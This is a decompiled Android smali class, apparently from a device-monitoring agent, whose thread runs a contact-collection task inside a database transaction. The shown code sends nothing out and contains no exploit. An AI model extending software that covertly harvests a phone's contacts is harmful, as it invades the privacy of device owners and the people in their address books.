.class public Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;
.super Ljava/lang/Thread;
.source "ContactObserver.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hp/vd/module/monitor/contact/ContactObserver;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x4
    name = "ThreadLister"
.end annotation


# instance fields
.field protected contactDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field final synthetic this$0:Lcom/hp/vd/module/monitor/contact/ContactObserver;


# direct methods
.method public constructor <init>(Lcom/hp/vd/module/monitor/contact/ContactObserver;Lcom/hp/vd/module/monitor/ContactMonitor;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/module/monitor/ContactMonitor;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 75
    iput-object p1, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->this$0:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    const/4 p1, 0x0

    .line 62
    iput-object p1, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 63
    iput-object p1, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->context:Lcom/hp/vd/context/Context;

    .line 64
    iput-object p1, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 65
    iput-object p1, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 66
    iput-object p1, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 76
    iput-object p2, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 77
    iput-object p3, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->context:Lcom/hp/vd/context/Context;

    .line 78
    iput-object p4, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 79
    iput-object p5, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 80
    iput-object p6, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .line 87
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->context:Lcom/hp/vd/context/Context;

    .line 88
    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v0

    new-instance v7, Lcom/hp/vd/module/monitor/contact/ContactCallable;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->context:Lcom/hp/vd/context/Context;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->contactDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v1, v7

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/monitor/contact/ContactCallable;-><init>(Lcom/hp/vd/module/monitor/ContactMonitor;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    .line 87
    invoke-static {v0, v7}, Lcom/j256/ormlite/misc/TransactionManager;->callInTransaction(Lcom/j256/ormlite/support/ConnectionSource;Ljava/util/concurrent/Callable;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 99
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method
